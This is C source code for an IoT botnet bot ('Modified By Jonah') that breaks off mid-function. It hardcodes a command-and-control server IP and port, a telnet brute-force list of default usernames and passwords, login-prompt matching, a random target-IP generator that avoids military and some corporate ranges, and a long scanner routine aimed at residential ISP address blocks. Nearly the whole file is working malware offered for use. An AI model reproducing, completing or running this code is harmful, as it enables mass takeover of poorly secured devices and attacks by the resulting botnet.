//Modified By Jonah

#define PR_SET_NAME 15
#define SERVER_LIST_SIZE (sizeof(commServer) / sizeof(unsigned char *))
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define CMD_IAC   255
#define CMD_WILL  251
#define CMD_WONT  252
#define CMD_DO    253
#define CMD_DONT  254
#define OPT_SGA   3
#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))
#define PHI 0x9e3779b9
#define KILLER_REBIND_TELNET
#define KILLER_MIN_PID              400
#define KILLER_RESTART_SCAN_TIME    600

#define killer_kill_by_port
#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
//edit everything in the box below
//-----------------------------------------------------------------------------------------------------------------------------------------------------------------
unsigned char *commServer[] = {"45.76.29.203"}; 
int Server_Botport = 23;
char *infect = "'\r\n";
//-----------------------------------------------------------------------------------------------------------------------------------------------------------
                             
//Username / Password Configuration
//-----------------------------------------------------------------------------------------------------------------------------------------------------------------
char *usernames[] = {"root\0", "telnet\0", "admin\0", "root\0", "support\0", "root\0", "root\0", "supervisor\0", "default\0", "admin\0", "admin\0", "daemon\0"};
char *passwords[] = {"1234567890\0", "telnet\0", "vnpt\0", "antslq\0", "support\0", "\0", "root\0", "zyad1234\0", "\0", "1234567890\0", "7ujMko0admin\0", "\0"};
//-----------------------------------------------------------------------------------------------------------------------------------------------------------------

//hack me ?
//-----------------------------------------------------------------------------------------------------------------------------------------------------------------
char *successes[] = {"BusyBox", "$", "#", ">", (char*)0};
char *advances[] = {":", "ogin", "sername", "assword", (char*)0};
char *fails[] = {"nvalid", "ailed", "ncorrect", "enied", "rror", "oodbye", "bad", (char*)0};
char *advances2[] = {"nvalid", "ailed", "ncorrect", "enied", "rror", "oodbye", "bad", "$", "#", "BusyBox", ">", (char*)0};
//-----------------------------------------------------------------------------------------------------------------------------------------------------------------

char *inet_ntoa(struct in_addr in);
int initConnection();
int sockprintf(int sock, char *formatStr, ...);
int mainCommSock = 0, currentServer = -1, userID = 1;
typedef uint32_t ipv4_t;

uint32_t *pids;
uint32_t scanPid;
uint32_t ngPid;
uint64_t numpids = 0;
struct in_addr ourIP;
unsigned char macAddress[6] = {0};

static uint32_t Q[4096], c = 362436;

void makeRandomStr(unsigned char *buf, int length);
void init_rand(uint32_t x)
{
        int i;

        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;

        for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

//oh, okay. Sweet dude!
const char alphabet[] = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWUXYZ";
int intN(int n) { return rand() % n; }
char *randomString(int len) {
  char *rstr = malloc((len + 1) * sizeof(char));
  int i;
  for (i = 0; i < len; i++) {
    rstr[i] = alphabet[intN(strlen(alphabet))];
  }
  rstr[len] = '\0';
  return rstr;
}

void trim(char *str)
{
        int i;
        int begin = 0;
        int end = strlen(str) - 1;

        while (isspace(str[begin])) begin++;

        while ((end >= begin) && isspace(str[end])) end--;
        for (i = begin; i <= end; i++) str[i - begin] = str[i];

        str[i - begin] = '\0';
}

uint32_t rand_cmwc(void)
{
        uint64_t t, a = 18782LL;
        static uint32_t i = 4095;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (uint32_t)(t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}

static void printchar(unsigned char **str, int c)
{
        if (str) {
                **str = c;
                ++(*str);
        }
        else (void)write(1, &c, 1);
}

static int prints(unsigned char **out, const unsigned char *string, int width, int pad)
{
        register int pc = 0, padchar = ' ';

        if (width > 0) {
                register int len = 0;
                register const unsigned char *ptr;
                for (ptr = string; *ptr; ++ptr) ++len;
                if (len >= width) width = 0;
                else width -= len;
                if (pad & PAD_ZERO) padchar = '0';
        }
        if (!(pad & PAD_RIGHT)) {
                for ( ; width > 0; --width) {
                        printchar (out, padchar);
                        ++pc;
                }
        }
        for ( ; *string ; ++string) {
                printchar (out, *string);
                ++pc;
        }
        for ( ; width > 0; --width) {
                printchar (out, padchar);
                ++pc;
        }

        return pc;
}

static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase)
{
        unsigned char print_buf[PRINT_BUF_LEN];
        register unsigned char *s;
        register int t, neg = 0, pc = 0;
        register unsigned int u = i;

        if (i == 0) {
                print_buf[0] = '0';
                print_buf[1] = '\0';
                return prints (out, print_buf, width, pad);
        }

        if (sg && b == 10 && i < 0) {
                neg = 1;
                u = -i;
        }

        s = print_buf + PRINT_BUF_LEN-1;
        *s = '\0';

        while (u) {
                t = u % b;
                if( t >= 10 )
                t += letbase - '0' - 10;
                *--s = t + '0';
                u /= b;
        }

        if (neg) {
                if( width && (pad & PAD_ZERO) ) {
                        printchar (out, '-');
                        ++pc;
                        --width;
                }
                else {
                        *--s = '-';
                }
        }

        return pc + prints (out, s, width, pad);
}

static int print(unsigned char **out, const unsigned char *format, va_list args )
{
        register int width, pad;
        register int pc = 0;
        unsigned char scr[2];

        for (; *format != 0; ++format) {
                if (*format == '%') {
                        ++format;
                        width = pad = 0;
                        if (*format == '\0') break;
                        if (*format == '%') goto out;
                        if (*format == '-') {
                                ++format;
                                pad = PAD_RIGHT;
                        }
                        while (*format == '0') {
                                ++format;
                                pad |= PAD_ZERO;
                        }
                        for ( ; *format >= '0' && *format <= '9'; ++format) {
                                width *= 10;
                                width += *format - '0';
                        }
                        if( *format == 's' ) {
							    register char *s = (char *)va_arg( args, intptr_t );
                                pc += prints (out, s?s:"(null)", width, pad);
                                continue;
                        }
                        if( *format == 'd' ) {
                                pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'x' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'X' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
                                continue;
                        }
                        if( *format == 'u' ) {
                                pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'c' ) {
                                scr[0] = (unsigned char)va_arg( args, int );
                                scr[1] = '\0';
                                pc += prints (out, scr, width, pad);
                                continue;
                        }
                }
                else {
out:
                        printchar (out, *format);
                        ++pc;
                }
        }
        if (out) **out = '\0';
        va_end( args );
        return pc;
}

int zprintf(const unsigned char *format, ...)
{
        va_list args;
        va_start( args, format );
        return print( 0, format, args );
}

int szprintf(unsigned char *out, const unsigned char *format, ...)
{
        va_list args;
        va_start( args, format );
        return print( &out, format, args );
}

int sockprintf(int sock, char *formatStr, ...)
{
        unsigned char *textBuffer = malloc(2048);
        memset(textBuffer, 0, 2048);
        char *orig = textBuffer;
        va_list args;
        va_start(args, formatStr);
        print(&textBuffer, formatStr, args);
        va_end(args);
        orig[strlen(orig)] = '\n';
        //zprintf("buf: %s\n", orig);
        int q = send(sock,orig,strlen(orig), MSG_NOSIGNAL);
        free(orig);
        return q;
}

static int *fdopen_pids;

int fdpopen(unsigned char *program, register unsigned char *type)
{
        register int iop;
        int pdes[2], fds, pid;

        if (*type != 'r' && *type != 'w' || type[1]) return -1;

        if (pipe(pdes) < 0) return -1;
        if (fdopen_pids == NULL) {
                if ((fds = getdtablesize()) <= 0) return -1;
                if ((fdopen_pids = (int *)malloc((unsigned int)(fds * sizeof(int)))) == NULL) return -1;
                memset((unsigned char *)fdopen_pids, 0, fds * sizeof(int));
        }

        switch (pid = vfork())
        {
        case -1:
                close(pdes[0]);
                close(pdes[1]);
                return -1;
        case 0:
                if (*type == 'r') {
                        if (pdes[1] != 1) {
                                dup2(pdes[1], 1);
                                close(pdes[1]);
                        }
                        close(pdes[0]);
                } else {
                        if (pdes[0] != 0) {
                                (void) dup2(pdes[0], 0);
                                (void) close(pdes[0]);
                        }
                        (void) close(pdes[1]);
                }
                execl("/bin/sh", "sh", "-c", program, NULL);
                _exit(127);
        }
        if (*type == 'r') {
                iop = pdes[0];
                (void) close(pdes[1]);
        } else {
                iop = pdes[1];
                (void) close(pdes[0]);
        }
        fdopen_pids[iop] = pid;
        return (iop);
}

int fdpclose(int iop)
{
        register int fdes;
        sigset_t omask, nmask;
        int pstat;
        register int pid;

        if (fdopen_pids == NULL || fdopen_pids[iop] == 0) return (-1);
        (void) close(iop);
        sigemptyset(&nmask);
        sigaddset(&nmask, SIGINT);
        sigaddset(&nmask, SIGQUIT);
        sigaddset(&nmask, SIGHUP);
        (void) sigprocmask(SIG_BLOCK, &nmask, &omask);
        do {
                pid = waitpid(fdopen_pids[iop], (int *) &pstat, 0);
        } while (pid == -1 && errno == EINTR);
        (void) sigprocmask(SIG_SETMASK, &omask, NULL);
        fdopen_pids[fdes] = 0;
        return (pid == -1 ? -1 : WEXITSTATUS(pstat));
}

unsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int got = 1, total = 0;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got == 0 ? NULL : buffer;
}

static const long hextable[] = {
        [0 ... 255] = -1,
        ['0'] = 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,
        ['A'] = 10, 11, 12, 13, 14, 15,
        ['a'] = 10, 11, 12, 13, 14, 15
};

long parseHex(unsigned char *hex)
{
        long ret = 0;
        while (*hex && ret >= 0) ret = (ret << 4) | hextable[*hex++];
        return ret;
}

int wildString(const unsigned char* pattern, const unsigned char* string) {
        switch(*pattern)
        {
        case '\0': return *string;
        case '*': return !(!wildString(pattern+1, string) || *string && !wildString(pattern, string+1));
        case '?': return !(*string && !wildString(pattern+1, string+1));
        default: return !((toupper(*pattern) == toupper(*string)) && !wildString(pattern+1, string+1));
        }
}

int getHost(unsigned char *toGet, struct in_addr *i)
{
        struct hostent *h;
        if((i->s_addr = inet_addr(toGet)) == -1) return 1;
        return 0;
}

void uppercase(unsigned char *str)
{
        while(*str) { *str = toupper(*str); str++; }
}



void makeRandomStr(unsigned char *buf, int length)
{
        int i = 0;
        for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}

int recvLine(int socket, unsigned char *buf, int bufsize)
{
        memset(buf, 0, bufsize);

        fd_set myset;
        struct timeval tv;
        tv.tv_sec = 30;
        tv.tv_usec = 0;
        FD_ZERO(&myset);
        FD_SET(socket, &myset);
        int selectRtn, retryCount;
        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                while(retryCount < 10)
                {

                        tv.tv_sec = 30;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(socket, &myset);
                        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                                retryCount++;
                                continue;
                        }

                        break;
                }
        }

        unsigned char tmpchr;
        unsigned char *cp;
        int count = 0;

        cp = buf;
        while(bufsize-- > 1)
        {
                if(recv(mainCommSock, &tmpchr, 1, 0) != 1) {
                        *cp = 0x00;
                        return -1;
                }
                *cp++ = tmpchr;
                if(tmpchr == '\n') break;
                count++;
        }
        *cp = 0x00;

//      zprintf("recv: %s\n", cp);

        return count;
}


int connectTimeout(int fd, char *host, int port, int timeout)
{
        struct sockaddr_in dest_addr;
        fd_set myset;
        struct timeval tv;
        socklen_t lon;

        int valopt;
        long arg = fcntl(fd, F_GETFL, NULL);
        arg |= O_NONBLOCK;
        fcntl(fd, F_SETFL, arg);

        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(port);
        if(getHost(host, &dest_addr.sin_addr)) return 0;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        if (res < 0) {
                if (errno == EINPROGRESS) {
                        tv.tv_sec = timeout;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(fd, &myset);
                        if (select(fd+1, NULL, &myset, NULL, &tv) > 0) {
                                lon = sizeof(int);
                                getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                                if (valopt) return 0;
                        }
                        else return 0;
                }
                else return 0;
        }

        arg = fcntl(fd, F_GETFL, NULL);
        arg &= (~O_NONBLOCK);
        fcntl(fd, F_SETFL, arg);

        return 1;
}

int listFork()
{
        uint32_t parent, *newpids, i;
        parent = fork();
        if (parent <= 0) return parent;
        numpids++;
        newpids = (uint32_t*)malloc((numpids + 1) * 4);
        for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
        newpids[numpids - 1] = parent;
        free(pids);
        pids = newpids;
        return parent;
}
int negotiate(int sock, unsigned char *buf, int len)
{
        unsigned char c;

        switch (buf[1]) {
        case CMD_IAC: /*dropped an extra 0xFF wh00ps*/ return 0;
        case CMD_WILL:
        case CMD_WONT:
        case CMD_DO:
        case CMD_DONT:
                c = CMD_IAC;
                send(sock, &c, 1, MSG_NOSIGNAL);
                if (CMD_WONT == buf[1]) c = CMD_DONT;
                else if (CMD_DONT == buf[1]) c = CMD_WONT;
                else if (OPT_SGA == buf[1]) c = (buf[1] == CMD_DO ? CMD_WILL : CMD_DO);
                else c = (buf[1] == CMD_DO ? CMD_WONT : CMD_DONT);
                send(sock, &c, 1, MSG_NOSIGNAL);
                send(sock, &(buf[2]), 1, MSG_NOSIGNAL);
                break;

        default:
                break;
        }

        return 0;
}

int matchPrompt(char *bufStr)
{
        char *prompts = ":>%$#\0";

        int bufLen = strlen(bufStr);
        int i, q = 0;
        for(i = 0; i < strlen(prompts); i++)
        {
                while(bufLen > q && (*(bufStr + bufLen - q) == 0x00 || *(bufStr + bufLen - q) == ' ' || *(bufStr + bufLen - q) == '\r' || *(bufStr + bufLen - q) == '\n')) q++;
                if(*(bufStr + bufLen - q) == prompts[i]) return 1;
        }

        return 0;
}

static ipv4_t get_random_ip(void)
{
uint32_t tmp;
uint8_t o1, o2, o3, o4;
do
{
        tmp = rand_cmwc();
        o1 = tmp & 0xff;
        o2 = (tmp >> 8) & 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
}
while 
          (o1 == 127 ||  // 127.0.0.0/8 - Loopback
          (o1 == 0) || // 0.0.0.0/8 - Invalid address space
          (o1 == 3) || // 3.0.0.0/8 - General Electric Company
          (o1 == 15 || o1 == 16) || // 15.0.0.0/7 - Hewlett-Packard Company
          (o1 == 56) || // 56.0.0.0/8 - US Postal Service
          (o1 == 10) || // 10.0.0.0/8 - Internal network
          (o1 == 192 && o2 == 168) || // 192.168.0.0/16 - Internal network
          (o1 == 172 && o2 >= 16 && o2 < 32) || // 172.16.0.0/14 - Internal network
          (o1 == 100 && o2 >= 64 && o2 < 127) || // 100.64.0.0/10 - IANA NAT reserved
          (o1 == 169 && o2 > 254) || // 169.254.0.0/16 - IANA NAT reserved
          (o1 == 208 && o2 == 67) || // whole sale
          (o1 == 72 && o2 == 246) || //akami
          (o1 == 170 && o2 > 209) || //fedz
          (o1 == 104 && o2 == 16) || //cloudflare
          (o1 == 128 && o2 == 190) || //i forgot
          (o1 == 198 && o2 >= 18 && o2 < 20) || // 198.18.0.0/15 - IANA Special use
          (o1 >= 224) || // 224.*.*.*+ - Multicast
          (o1 >= 225) || // 225.*.*.*+ - Multicast
          (o1 >= 226) || // 226.*.*.*+ - Multicast
          (o1 >= 227) || // 227.*.*.*+ - Multicast
          (o1 >= 228) || // 228.*.*.*+ - Multicast
          (o1 >= 239) || // 239.*.*.*+ - Multicast
          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
 );
 char ip[16];
 szprintf(ip, "%d.%d.%d.%d", o1, o2, o3, o4);
 return INET_ADDR(o1,o2,o3,o4);

}

static uint8_t ipState[5] = {0};
in_addr_t HackerScan2()
{
char ip[16];
ipState[1] = 0;
ipState[2] = 0;
ipState[3] = 0;
ipState[4] = 0;
ipState[1] = rand() % 255;
ipState[2] = rand() % 255;
ipState[3] = rand() % 255;
ipState[4] = rand() % 255;
int randnum = rand() % 241;
if(randnum == 0)
{
szprintf(ip, "96.30.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 1)
{
szprintf(ip, "210.213.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 2)
{
szprintf(ip, "122.2.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 3)
{
szprintf(ip, "122.3.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 4)
{
szprintf(ip, "95.9.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 5)
{
szprintf(ip, "41.252.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 6)
{
szprintf(ip, "119.94.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 7)
{
szprintf(ip, "104.55.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 8)
{
szprintf(ip, "78.186.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 9)
{
szprintf(ip, "119.93.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 10)
{
szprintf(ip, "119.92.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 11)
{
szprintf(ip, "124.83.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 12)
{
szprintf(ip, "41.254.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 13)
{
szprintf(ip, "103.20.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 14)
{
szprintf(ip, "103.47.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 15)
{
szprintf(ip, "122.54.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 16)
{
szprintf(ip, "122.53.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 17)
{
szprintf(ip, "122.52.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 18)
{
szprintf(ip, "137.59.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 19)
{
szprintf(ip, "14.204.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 20)
{
szprintf(ip, "27.54.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 21)
{
szprintf(ip, "43.253.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 22)
{
szprintf(ip, "43.230.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 23)
{
szprintf(ip, "124.107.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 24)
{
szprintf(ip, "43.230.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 25)
{
szprintf(ip, "124.106.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 26)
{
szprintf(ip, "43.245.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 27)
{
szprintf(ip, "124.105.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 28)
{
szprintf(ip, "123.25.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 29)
{
szprintf(ip, "103.54.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 30)
{
szprintf(ip, "27.255.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 31)
{
szprintf(ip, "103.204.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 32)
{
szprintf(ip, "123.24.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 33)
{
szprintf(ip, "113.191.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 35)
{
szprintf(ip, "113.188.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 36)
{
szprintf(ip, "113.189.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 37)
{
szprintf(ip, "124.104.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 38)
{
szprintf(ip, "14.160.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 39)
{
szprintf(ip, "14.161.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 40)
{
szprintf(ip, "14.162.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 41)
{
szprintf(ip, "14.163.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 42)
{
szprintf(ip, "14.164.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 43)
{
szprintf(ip, "14.165.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 44)
{
szprintf(ip, "14.166.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 45)
{
szprintf(ip, "14.167.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 46)
{
szprintf(ip, "14.168.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 47)
{
szprintf(ip, "14.169.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 48)
{
szprintf(ip, "14.170.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 49)
{
szprintf(ip, "14.171.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 50)
{
szprintf(ip, "14.172.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 51)
{
szprintf(ip, "14.173.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 52)
{
szprintf(ip, "14.174.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 53)
{
szprintf(ip, "14.175.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 54)
{
szprintf(ip, "14.176.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 55)
{
szprintf(ip, "14.177.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 56)
{
szprintf(ip, "14.178.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 57)
{
szprintf(ip, "14.179.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 58)
{
szprintf(ip, "14.180.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 59)
{
szprintf(ip, "14.181.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 60)
{
szprintf(ip, "14.182.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 61)
{
szprintf(ip, "14.183.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 62)
{
szprintf(ip, "14.184.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 63)
{
szprintf(ip, "14.185.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 64)
{
szprintf(ip, "14.186.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 65)
{
szprintf(ip, "14.187.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 66)
{
szprintf(ip, "14.188.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 67)
{
szprintf(ip, "14.189.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 68)
{
szprintf(ip, "14.190.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 69)
{
szprintf(ip, "14.191.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 70)
{
szprintf(ip, "89.18.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 71)
{
szprintf(ip, "146.88.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 72)
{
szprintf(ip, "122.252.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 73)
{
szprintf(ip, "43.252.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 74)
{
szprintf(ip, "43.230.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 75)
{
szprintf(ip, "43.240.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 76)
{
szprintf(ip, "43.245.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 77)
{
szprintf(ip, "41.174.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 78)
{
szprintf(ip, "49.118.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 79)
{
szprintf(ip, "49.144.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 80)
{
szprintf(ip, "49.145.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 81)
{
szprintf(ip, "103.30.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 82)
{
szprintf(ip, "14.33.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 83)
{
szprintf(ip, "123.16.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 84)
{
szprintf(ip, "202.44.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 85)
{
szprintf(ip, "116.93.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 86)
{
szprintf(ip, "49.146.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 87)
{
szprintf(ip, "41.253.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 88)
{
szprintf(ip, "117.173.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 89)
{
szprintf(ip, "113.190.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 90)
{
szprintf(ip, "185.106.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 91)
{
szprintf(ip, "112.196.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 92)
{
szprintf(ip, "113.178.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 93)
{
szprintf(ip, "112.45.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 94)
{
szprintf(ip, "183.223.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 95)
{
szprintf(ip, "116.71.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 96)
{
szprintf(ip, "103.44.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 97)
{
szprintf(ip, "110.235.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 98)
{
szprintf(ip, "124.253.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 99)
{
szprintf(ip, "211.237.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 100)
{
szprintf(ip, "117.175.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 101)
{
szprintf(ip, "117.173.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 102)
{
szprintf(ip, "178.93.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 103)
{
szprintf(ip, "111.9.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 104)
{
szprintf(ip, "222.252.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 105)
{
szprintf(ip, "113.174.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 106)
{
szprintf(ip, "222.252.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 107)
{
szprintf(ip, "113.160.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 108)
{
szprintf(ip, "113.161.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 109)
{
szprintf(ip, "113.162.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 100)
{
szprintf(ip, "113.163.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 101)
{
szprintf(ip, "113.164.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 102)
{
szprintf(ip, "113.165.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 103)
{
szprintf(ip, "113.166.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 104)
{
szprintf(ip, "113.167.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 105)
{
szprintf(ip, "113.168.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 106)
{
szprintf(ip, "113.169.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 107)
{
szprintf(ip, "123.17.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 108)
{
szprintf(ip, "123.18.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 109)
{
szprintf(ip, "123.19.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 110)
{
szprintf(ip, "123.20.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 111)
{
szprintf(ip, "123.21.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 112)
{
szprintf(ip, "123.22.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 113)
{
szprintf(ip, "222.252.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 114)
{
szprintf(ip, "222.253.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 115)
{
szprintf(ip, "222.254.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 116)
{
szprintf(ip, "222.255.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 117)
{
szprintf(ip, "37.247.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 118)
{
szprintf(ip, "41.208.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 119)
{
szprintf(ip, "183.220.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 120)
{
szprintf(ip, "49.147.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 121)
{
szprintf(ip, "103.198.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 122)
{
szprintf(ip, "183.223.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 123)
{
szprintf(ip, "49.148.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 124)
{
szprintf(ip, "88.248.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 125)
{
szprintf(ip, "88.105.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 126)
{
szprintf(ip, "88.247.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 127)
{
szprintf(ip, "85.105.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 128)
{
szprintf(ip, "188.3.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 129)
{
szprintf(ip, "103.203.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 130)
{
szprintf(ip, "103.55.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 131)
{
